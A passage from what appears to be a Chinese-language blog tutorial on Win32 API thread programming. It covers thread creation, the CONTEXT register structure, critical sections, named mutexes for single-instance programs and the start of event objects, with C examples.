<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6387)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	n = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span>* np = &amp;n;</span><br><span class="line"></span><br><span class="line">	HANDLE harrThreadArray[<span class="number">2</span>];</span><br><span class="line">	harrThreadArray[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, (LPTHREAD_START_ROUTINE)np, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> l;</span><br><span class="line">	l = <span class="number">50</span>;</span><br><span class="line">	<span class="type">int</span>* lp = &amp;l;</span><br><span class="line"></span><br><span class="line">	harrThreadArray[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, (LPTHREAD_START_ROUTINE)lp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	DWORD dwResultArray[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, harrThreadArray, TRUE, INFINITE);</span><br><span class="line">	GetExitCodeThread(harrThreadArray[<span class="number">0</span>], &amp;dwResultArray[<span class="number">0</span>]);</span><br><span class="line">	GetExitCodeThread(harrThreadArray[<span class="number">1</span>], &amp;dwResultArray[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线程执行完毕\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线程1执行完毕返回：%d；线程2执行完毕返回：%d\n&quot;</span>, dwResultArray[<span class="number">0</span>], dwResultArray[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;其他程序...&quot;</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/05/Win32API/image-20240305224608996.png" alt="image-20240305224608996" style="zoom:33%;">

<h4 id="CONTEXT线程上下文"><a href="#CONTEXT线程上下文" class="headerlink" title="CONTEXT线程上下文"></a>CONTEXT线程上下文</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DECLSPEC_NOINITALL</span> _<span class="title">CONTEXT</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The flags values within this flag control the contents of</span></span><br><span class="line">    <span class="comment">// a CONTEXT record.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// If the context record is used as an input parameter, then</span></span><br><span class="line">    <span class="comment">// for each portion of the context record controlled by a flag</span></span><br><span class="line">    <span class="comment">// whose value is set, it is assumed that that portion of the</span></span><br><span class="line">    <span class="comment">// context record contains valid context. If the context record</span></span><br><span class="line">    <span class="comment">// is being used to modify a threads context, then only that</span></span><br><span class="line">    <span class="comment">// portion of the threads context will be modified.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// If the context record is used as an IN OUT parameter to capture</span></span><br><span class="line">    <span class="comment">// the context of a thread, then only those portions of the thread&#x27;s</span></span><br><span class="line">    <span class="comment">// context corresponding to set flags will be returned.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The context record is never used as an OUT only parameter.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if CONTEXT_DEBUG_REGISTERS is</span></span><br><span class="line">    <span class="comment">// set in ContextFlags.  Note that CONTEXT_DEBUG_REGISTERS is NOT</span></span><br><span class="line">    <span class="comment">// included in CONTEXT_FULL.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   Dr0;</span><br><span class="line">    DWORD   Dr1;</span><br><span class="line">    DWORD   Dr2;</span><br><span class="line">    DWORD   Dr3;</span><br><span class="line">    DWORD   Dr6;</span><br><span class="line">    DWORD   Dr7;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_FLOATING_POINT.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_SEGMENTS.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   SegGs;</span><br><span class="line">    DWORD   SegFs;</span><br><span class="line">    DWORD   SegEs;</span><br><span class="line">    DWORD   SegDs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_INTEGER.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   Edi;</span><br><span class="line">    DWORD   Esi;</span><br><span class="line">    DWORD   Ebx;</span><br><span class="line">    DWORD   Edx;</span><br><span class="line">    DWORD   Ecx;</span><br><span class="line">    DWORD   Eax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the</span></span><br><span class="line">    <span class="comment">// ContextFlags word contians the flag CONTEXT_CONTROL.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   Ebp;</span><br><span class="line">    DWORD   Eip;</span><br><span class="line">    DWORD   SegCs;              <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">// MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;</span><br><span class="line">    DWORD   SegSs;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This section is specified/returned if the ContextFlags word</span></span><br><span class="line">    <span class="comment">// contains the flag CONTEXT_EXTENDED_REGISTERS.</span></span><br><span class="line">    <span class="comment">// The format and contexts are processor specific</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line"></span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></figure>

<p>这个结构体中存储了所有的寄存器，这也就是为什么当单核CPU能够循环执行多个线程，因为被挂起的线程会在挂起时将所有寄存器的数据都存在这个结构体中。</p>
<img src="/2024/07/05/Win32API/image-20240305230138707.png" alt="image-20240305230138707" style="zoom:33%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6387)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;----------%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* p = (<span class="type">int</span>*)lpParameter;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; *p; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">25</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;++++++++++%d\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	n = <span class="number">100</span>;</span><br><span class="line">	<span class="type">int</span>* np = &amp;n;</span><br><span class="line"></span><br><span class="line">	HANDLE harrThreadArray[<span class="number">2</span>];</span><br><span class="line">	harrThreadArray[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc1, (LPTHREAD_START_ROUTINE)np, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> l;</span><br><span class="line">	l = <span class="number">50</span>;</span><br><span class="line">	<span class="type">int</span>* lp = &amp;l;</span><br><span class="line"></span><br><span class="line">	harrThreadArray[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, (LPTHREAD_START_ROUTINE)lp, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	Sleep(<span class="number">100</span>);</span><br><span class="line">	SuspendThread(harrThreadArray[<span class="number">0</span>]);</span><br><span class="line">	CONTEXT context;</span><br><span class="line">	context.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line">	GetThreadContext(harrThreadArray[<span class="number">0</span>], &amp;context);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x %x\n&quot;</span>, context.Eax, context.Ecx);</span><br><span class="line">	ResumeThread(harrThreadArray[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	DWORD dwResultArray[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, harrThreadArray, TRUE, INFINITE);</span><br><span class="line">	GetExitCodeThread(harrThreadArray[<span class="number">0</span>], &amp;dwResultArray[<span class="number">0</span>]);</span><br><span class="line">	GetExitCodeThread(harrThreadArray[<span class="number">1</span>], &amp;dwResultArray[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线程执行完毕\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;线程1执行完毕返回：%d；线程2执行完毕返回：%d\n&quot;</span>, dwResultArray[<span class="number">0</span>], dwResultArray[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;其他程序...&quot;</span>);</span><br><span class="line"></span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(harrThreadArray[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h4><p>在挂起线程时，还可以使用SetThreadContext改变寄存器中的数值。</p>
<h3 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h3><h4 id="临界资源"><a href="#临界资源" class="headerlink" title="临界资源"></a>临界资源</h4><p>当两个线程同时要访问一个全局变量的时候，可能出现同时访问的情况，导致线程安全受影响。</p>
<h4 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h4><p>一段使用临界资源的代码称为临界区。</p>
<h4 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h4><p>Windows实现线程锁的方法：<img src="/2024/07/05/Win32API/image-20240305233145434.png" alt="image-20240305233145434" style="zoom:50%;"></p>
<h4 id="调用API"><a href="#调用API" class="headerlink" title="调用API"></a>调用API</h4><p>临界区之实现线程锁：</p>
<p>&lt;1&gt;创建全局变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CRITICAL_SECTION cs;		<span class="comment">//可以理解成一个令牌</span></span><br></pre></td></tr></table></figure>

<p>&lt;2&gt;初始化全局变量</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">InitializeCriticalSection(&amp;cs);</span><br></pre></td></tr></table></figure>

<p>&lt;3&gt;实现临界区</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EnterCriticalSection(&amp;cs);		<span class="comment">//进入临界区</span></span><br><span class="line">	<span class="comment">//使用临界资源</span></span><br><span class="line">LeaveCriticalSection(&amp;cs);		<span class="comment">//离开临界区</span></span><br></pre></td></tr></table></figure>

<p>比如这样一段买票的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ticket = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProcess</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span> (ticket &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;还有%d张票	&quot;</span>, ticket);</span><br><span class="line">		ticket--;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;卖出一张，还剩%d张\n&quot;</span>, ticket);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThreadArr[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	hThreadArr[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProcess, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hThreadArr[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProcess, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, hThreadArr, TRUE, INFINITE);</span><br><span class="line">	CloseHandle(hThreadArr[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(hThreadArr[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有些时候会出现这么个情况</p>
<p><img src="/2024/07/05/Win32API/image-20240305235438634.png" alt="image-20240305235438634"></p>
<p>说明两个线程A在阻塞时线程B停在了它不该停的地方</p>
<p>更改代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">CRITICAL_SECTION cs;</span><br><span class="line"><span class="type">int</span> ticket = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProcess</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>* pt = (<span class="type">int</span>*)lpParameter;</span><br><span class="line"></span><br><span class="line">	EnterCriticalSection(&amp;cs);</span><br><span class="line">	<span class="keyword">while</span> (ticket &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Thread:%d	还有%d张票	\n&quot;</span>, *pt, ticket);</span><br><span class="line">		ticket--;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;		卖出一张，还剩%d张\n&quot;</span>, ticket);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;--------------------------\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	LeaveCriticalSection(&amp;cs);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	InitializeCriticalSection(&amp;cs);</span><br><span class="line">	HANDLE hThreadArr[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> ThreadC[<span class="number">2</span>];</span><br><span class="line">	ThreadC[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	ThreadC[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* pThread[<span class="number">2</span>];</span><br><span class="line">	pThread[<span class="number">0</span>] = &amp;ThreadC[<span class="number">0</span>];</span><br><span class="line">	pThread[<span class="number">1</span>] = &amp;ThreadC[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	hThreadArr[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProcess, (LPTHREAD_START_ROUTINE)pThread[<span class="number">0</span>], <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	hThreadArr[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProcess, (LPTHREAD_START_ROUTINE)pThread[<span class="number">1</span>], <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForMultipleObjects(<span class="number">2</span>, hThreadArr, TRUE, INFINITE);</span><br><span class="line">	CloseHandle(hThreadArr[<span class="number">0</span>]);</span><br><span class="line">	CloseHandle(hThreadArr[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/07/05/Win32API/image-20240306141752501.png" alt="image-20240306141752501" style="zoom:50%;">

<p>当线程1执行时进入临界区，那么线程2就无法访问临界资源，直到线程1离开了临界区（归还令牌）后，线程2才能够访问临界资源，但是当线程2再拿着ticket&#x3D;0进来的时候，已经不满足条件，就直接跳过了。</p>
<h2 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h2><h3 id="互斥体-1"><a href="#互斥体-1" class="headerlink" title="互斥体"></a>互斥体</h3><p>内核级临界资源怎么办？</p>
<p>假设A进程的B线程和C进程的D线程，同时使用的是内核级的临界资源（内核对象：线程、文件、进程…）该怎么让这个访问是安全的？使用线程锁的方式明显不行，因为线程锁仅能控制同进程中的多线程。</p>
<img src="/2024/07/05/Win32API/image2021-5-27_16-8-12.png" alt="images/download/attachments/1015833/image2021-5-27_16-8-12.png" style="zoom:50%;">

<p>那么这时候我们就需要一个<strong>能够放在内核中的令牌</strong>来控制，而实现这个作用的，我们称之为<strong>互斥体</strong>。</p>
<img src="/2024/07/05/Win32API/image2021-5-27_16-10-43.png" alt="images/download/attachments/1015833/image2021-5-27_16-10-43.png" style="zoom:50%;">

<h3 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateMutex</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES lpMutexAttributes,  <span class="comment">// SD 安全属性，包含安全描述符</span></span></span><br><span class="line"><span class="params">  BOOL bInitialOwner,                       <span class="comment">// initial owner 是否希望互斥体创建出来就有信号，或者说就可以使用.如果希望的话就为FALSE；官方解释为如果该值为TRUE则表示当前进程拥有该互斥体所有权</span></span></span><br><span class="line"><span class="params">  LPCTSTR lpName                            <span class="comment">// object name 互斥体的名字，随便起，不同程序之间靠这个名字使用互斥体</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>由线程A创建了一个互斥体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE cm = CreateMutex(<span class="literal">NULL</span>,TRUE,<span class="string">&quot;nMutex&quot;</span>);</span><br><span class="line"></span><br><span class="line">	WaitForSingleObject(cm, INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Process:A Thread:X -&gt;%d++++++++++\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ReleaseMutex(cm);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在B进程中使用了这个互斥体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE tMutex = CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">L&quot;nMutex&quot;</span>);</span><br><span class="line"></span><br><span class="line">	WaitForSingleObject(tMutex, INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Process:B Thread:Y -&gt;%d----------\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个不同进程的不同线程通过<code>nMutex</code>这个互斥体名字进行访问。</p>
<p>当进程A启动后再启动进程B：</p>
<img src="/2024/07/05/Win32API/image-20240306152912660.png" alt="image-20240306152912660" style="zoom:30%;">

<p>发现进程A先执行，进程B被阻塞了。</p>
<h3 id="互斥体实现禁止多开"><a href="#互斥体实现禁止多开" class="headerlink" title="互斥体实现禁止多开"></a>互斥体实现禁止多开</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建互斥体</span></span><br><span class="line">    HANDLE cm = CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">&quot;XYZ&quot;</span>);</span><br><span class="line">    <span class="comment">// 判断互斥体是否创建失败</span></span><br><span class="line">    <span class="keyword">if</span> (cm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 判断互斥体是否已经存在，如果存在则表示程序被多次打开</span></span><br><span class="line">        <span class="keyword">if</span> (GetLastError() == ERROR_ALREADY_EXISTS) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;该程序已经开启了，请勿再次开启！&quot;</span>);</span><br><span class="line">            getchar();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 等待互斥体状态发生变化，也就是有信号或为互斥体拥有者，获取令牌</span></span><br><span class="line">            WaitForSingleObject(cm, INFINITE);</span><br><span class="line">            <span class="comment">// 操作资源</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Process: A Thread: B -- %d \n&quot;</span>, i);</span><br><span class="line">                Sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 释放令牌</span></span><br><span class="line">            ReleaseMutex(cm);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateMutex 创建失败! 错误代码: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/05/Win32API/image-20240306153359061.png" alt="image-20240306153359061"></p>
<p>当已经运行一个程序时，再打开第二个会显示程序已开启。</p>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><h3 id="通知类型"><a href="#通知类型" class="headerlink" title="通知类型"></a>通知类型</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateEvent</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES lpEventAttributes, <span class="comment">// SD 安全属性，包含安全描述符</span></span></span><br><span class="line"><span class="params">  BOOL bManualReset,                       <span class="comment">// reset type 如果你希望当前事件类型是通知类型则写TRUE，反之FALSE</span></span></span><br><span class="line"><span class="params">  BOOL bInitialState,                      <span class="comment">// initial state 初始状态，决定创建出来时候是否有信号，有为TRUE，没有为FALSE</span></span></span><br><span class="line"><span class="params">  LPCTSTR lpName                           <span class="comment">// object name 事件名字</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<h3 id="生产者与消费者"><a href="#生产者与消费者" class="headerlink" title="生产者与消费者"></a>生产者与消费者</h3><p>要求：生产者生产一个产品，消费者消耗一个产品。如果不使用通知实现，使用互斥体的话：</p>
